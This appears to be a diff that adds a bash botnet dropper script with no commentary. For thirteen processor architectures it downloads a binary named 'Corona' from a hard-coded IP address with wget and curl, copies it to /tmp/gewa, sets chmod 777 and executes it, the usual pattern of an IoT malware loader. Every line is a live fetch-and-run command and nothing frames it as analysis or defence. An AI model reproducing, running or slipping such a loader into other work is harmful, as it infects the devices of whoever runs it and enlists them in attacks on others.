@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp ; wget http://192.3.193.251/Corona.mips; curl -O http://192.3.193.251/Corona.mips;cat Corona.mips >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.mipsel; curl -O http://192.3.193.251/Corona.mipsel;cat Corona.mipsel >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.sh4; curl -O http://192.3.193.251/Corona.sh4;cat Corona.sh4 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.x86_64; curl -O http://192.3.193.251/Corona.x86_64;cat Corona.x86_64 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.arm6; curl -O http://192.3.193.251/Corona.arm6;cat Corona.arm6 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.i686; curl -O http://192.3.193.251/Corona.i686;cat Corona.i686 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.ppc; curl -O http://192.3.193.251/Corona.ppc;cat Corona.ppc >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.i586; curl -O http://192.3.193.251/Corona.i586;cat Corona.i586 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.m68k; curl -O http://192.3.193.251/Corona.m68k;cat Corona.m68k >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.sparc; curl -O http://192.3.193.251/Corona.sparc;cat Corona.sparc >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.arm4; curl -O http://192.3.193.251/Corona.arm4;cat Corona.arm4 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.arm5; curl -O http://192.3.193.251/Corona.arm5;cat Corona.arm5 >gewa;chmod 777 *;/tmp/gewa
+cd /tmp ; wget http://192.3.193.251/Corona.arm7; curl -O http://192.3.193.251/Corona.arm7;cat Corona.arm7 >gewa;chmod 777 *;/tmp/gewa
